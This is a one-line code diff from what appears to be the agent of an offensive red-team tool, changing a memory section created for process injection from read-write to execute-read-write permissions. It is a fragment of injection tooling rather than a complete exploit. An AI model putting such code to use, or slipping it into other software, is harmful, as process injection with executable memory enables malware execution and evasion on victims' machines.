@@ -203,7 +203,7 @@ namespace RedPeanutAgent.Execution
 
             //Crteate section in current process
             IntPtr section = IntPtr.Zero;
-            section = InjectionHelper.CreateSection(size, Core.Natives.PAGE_READWRITE);
+            section = InjectionHelper.CreateSection(size, Core.Natives.PAGE_EXECUTE_READWRITE);
             if (section == IntPtr.Zero)
             {
                 return;
